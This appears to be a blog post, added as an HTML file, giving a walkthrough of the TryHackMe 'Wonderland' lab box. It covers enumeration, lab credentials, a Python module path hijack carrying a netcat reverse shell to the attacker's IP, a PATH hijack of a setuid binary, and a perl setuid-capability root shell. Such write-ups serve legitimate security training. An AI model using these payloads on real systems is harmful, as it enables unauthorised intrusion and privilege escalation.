@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <link rel="stylesheet" type="text/css" href="/css/style.css">
+  <script src="https://kit.fontawesome.com/65ad30df58.js" crossorigin="anonymous"></script>
+  <script src="/dist/mark.min.js" charset="UTF-8"></script>
+<title>TryHackMe - Wonderland Writeup &mdash; fmash16's blog</title>
+<meta property="og:title" content="TryHackMe - Wonderland Writeup" />
+      <meta property="og:description" content="A linux machine having a number of techniques for privesc - python path hijack, environment PATH hijack, linux file capabilities." />
+      <meta property="og:type" content="article" />
+      <meta property="og:url" content="github" />
+      <meta property="og:image" content="/img/tryhackme_wonderland/card.png" />
+
+</head>
+
+<body>
+  <!-- Side navigation -->
+	<div class="sidebar">
+    <div class="vertical-center">
+      <a href="/index.html" style="text-align:center"><img class="logo" src="/avatar.png" alt=""></a>
+      <p style="text-align:center; color:#eee">
+      <b style="font-size:1.7em;text-align:center; color:#eee">fmash16</b><br/>
+      Student<br/>Infosec & Linux Enthusiast<br/><a href="/about.html" style="color:#0489B1">About me</a></p>
+      <p style="text-align:center;font-size:20px">
+        <a href="mailto:fmash16@gmail.com" style="display:inline"><i class="far fa-envelope"></i></a> 
+        <a href="https://github.com/fmash16" style="display:inline"><i class="fab fa-github"></i></a> 
+        <a href="https://twitter.com/fmash16" style="display:inline"><i class="fab fa-twitter"></i></a>
+        <a href="https://reddit.com/user/fmash16" style="display:inline"><i class="fab fa-reddit-alien"></i></a>
+      </p>
+    </div>
+	</div>
+
+<article>
+<h1 id="tryhackme---wonderland-writeup">TryHackMe - Wonderland Writeup</h1>
+<div class="figure">
+<img src="/img/tryhackme_wonderland/card.png" />
+
+</div>
+<p>As usual, we add the machine IP to our /etc/hosts file</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">10.10.226.99</span> wonderland.thm</code></pre></div>
+<h1 id="nmap-scan">Nmap Scan</h1>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="fu">nmap</span> -sC -sV -sS -oN nmap.out wonderland.thm</code></pre></div>
+<p>Open ports:</p>
+<ul>
+<li>22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</li>
+<li>80/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API)</li>
+</ul>
+<h1 id="enumeration">Enumeration</h1>
+<h2 id="http-web-page">HTTP web page</h2>
+<p>Going to port 80, we find a webpage.</p>
+<div class="figure">
+<img src="/img/tryhackme_wonderland/1.png" />
+
+</div>
+<h2 id="gobuster-fuzzing">Gobuster Fuzzing</h2>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">gobuster</span> dir -u http://wonderland.thm/ -w /usr/share/wordlists/dirb/common.txt</code></pre></div>
+<p>We find the following</p>
+<div class="figure">
+<img src="/img/tryhackme_wonderland/2.png" />
+
+</div>
+<h2 id="img">/img</h2>
+<p>Under the img folder, we find 3 images</p>
+<div class="figure">
+<img src="/img/tryhackme_wonderland/3.png" />
+
+</div>
+<h2 id="r">/r</h2>
+<p>In the /r folder we find the following</p>
+<div class="figure">
+<img src="/img/tryhackme_wonderland/4.png" />
+
+</div>
+<h3 id="fuzzing-r">Fuzzing /r</h3>
+<p>We fuzz for some more contents under /r using ffuf and find a directory /a. It says us to continue down the rabbit hole. It seems that we have a pattern here --&gt; /r/a/..., so we can guess the next directories will be /b/b/i/t. So the path becomes /r/a/b/b/i/t. We go to the address <code>http://wonderland.thm/r/a/b/b/i/t/</code>.</p>
+<div class="figure">
+<img src="/img/tryhackme_wonderland/5.png" />
+
+</div>
+<p>Having a look at the source of the page, we find the following</p>
+<div class="figure">
+<img src="/img/tryhackme_wonderland/6.png" />
+
+</div>
+<p>Creds found :</p>
+<blockquote>
+<p>alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>
+</blockquote>
+<p>We can use these creds to login to the machine using SSH.</p>
+<div class="figure">
+<img src="/img/tryhackme_wonderland/7.png" />
+
+</div>
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<h2 id="user---rabbit">User - rabbit</h2>
+<p>We check the sudo privileges of the user alice and find the following</p>
+<div class="figure">
+<img src="/img/tryhackme_wonderland/8.png" />
+
+</div>
+<p>So we can run the following as the user <code>rabbit</code></p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">/usr/bin/python3.6</span> /home/alice/walrus_and_the_carpenter.py</code></pre></div>
+<p>We have a look at the python script</p>
+<div class="sourceCode"><pre class="sourceCode python"><code class="sourceCode python"><span class="im">import</span> random
+poem <span class="op">=</span> <span class="st">&quot;&quot;&quot;The sun was shining on the sea,</span>
+<span class="st">Shining with all his might:</span>
+<span class="st">He did his very best to make</span>
+<span class="st">............................</span>
+<span class="st">............................</span>
+<span class="st">And that was scarcely odd, because</span>
+<span class="st">Theyd eaten every one.&quot;&quot;&quot;</span>
+
+<span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">10</span>):
+    line <span class="op">=</span> random.choice(poem.split(<span class="st">&quot;</span><span class="ch">\n</span><span class="st">&quot;</span>))
+    <span class="bu">print</span>(<span class="st">&quot;The line was:</span><span class="ch">\t</span><span class="st">&quot;</span>, line)</code></pre></div>
+<p>It import the python library &quot;random&quot;. We can use <code>python path hijack</code> here to escalate our privileges. The script will look for the random module in its working directory first. And since we have write permissions in the working directory, we can write a script &quot;random.py&quot; with the function <code>choice</code> that gets called in the script, executing a reverse shell of ours to escalte the privileges. So we create a file random.py in the same directory as follows</p>
+<div class="sourceCode"><pre class="sourceCode python"><code class="sourceCode python"><span class="im">import</span> os
+
+<span class="kw">def</span> choice(a):
+  os.system(<span class="st">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.9.17.253 1337&gt;/tmp/f&quot;</span>)</code></pre></div>
+<p>Now we run the following as user &quot;rabbit&quot;</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="fu">sudo</span> -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py</code></pre></div>
+<p>We open up a nc listener on our host and get a shell back.</p>
+<div class="figure">
+<img src="/img/tryhackme_wonderland/9.png" />
+
+</div>
+<h2 id="user---hatter">User - hatter</h2>
+<p>Going over to /home/rabbit, we find an ELF executable binary <code>teaParty</code>. We copy the executable to our local machine and examinte it with ghidra. Ghidra decompiles the binary for us and show us the main function in C as follows:</p>
+<div class="figure">
+<img src="/img/tryhackme_wonderland/10.png" />
+
+</div>
+<p>We see that the program has setuid as user with id=1003 which is the user &quot;hatter&quot;. We also notice the command executed in the binary and find that the command <code>date</code> is executed without using absolute path. So we can hijack the PATH <code>date</code> is called from, by creating an executable named &quot;date&quot; and adding it to the environment PATH.</p>
+<p>So we create a file named &quot;date&quot; in a directory /tmp/path containing</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="co">#!/bin/sh</span>
+
+<span class="fu">bash</span> -i</code></pre></div>
+<p>So, since the program is setuid, we will get an interactive bash shell as user hatter.We make it executable and add the directory to our Environment PATH</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="fu">chmod</span> 777 /tmp/path/date
+<span class="bu">export</span> <span class="va">PATH=</span>/tmp/path:<span class="va">$PATH</span></code></pre></div>
+<p>Now, we execute the binary and get a shell as the user &quot;hatter&quot;</p>
+<div class="figure">
+<img src="/img/tryhackme_wonderland/11.png" />
+
+</div>
+<p>In the home directory, we find the password for user hatter. Creds found:</p>
+<blockquote>
+<p>hatter:WhyIsARavenLikeAWritingDesk?</p>
+</blockquote>
+<p>So, now, we can SSH into the machine as user hatter.</p>
+<h1 id="privilege-escalation---root">Privilege Escalation - root</h1>
+<p>Running linpeas.sh on the target, we find the following escalation vector</p>
+<div class="figure">
+<img src="/img/tryhackme_wonderland/12.png" />
+
+</div>
+<p>We see that the program <code>/usr/bin/perl</code> has the capability <code>setuid</code>. So, we can exploit this and get command execution with root.</p>
+<p>The privilege escalation using capabilities has been explained well at <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities">hacktricks</a></p>
+<p>We can find the privesc method using perl and its capability on <a href="https://gtfobins.github.io/gtfobins/perl/#capabilities">gtfobins</a>.</p>
+<p>Following that, we execute the following to get our root shell.</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">/usr/bin/perl</span> -e <span class="st">&#39;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;/bin/sh&quot;;&#39;</span></code></pre></div>
+<p>And we get the root shell. Now, we can read our root.txt.</p>
+<div class="figure">
+<img src="/img/tryhackme_wonderland/13.png" />
+
+</div>
+<p>PS. In this box, as the hint suggests, everything is upside down, meaning root.txt is in users' home, and user.txt is in /root.</p>
+</article>
+
+<footer>
+  <p> By fmash16 </p>
+</footer>
+</body>
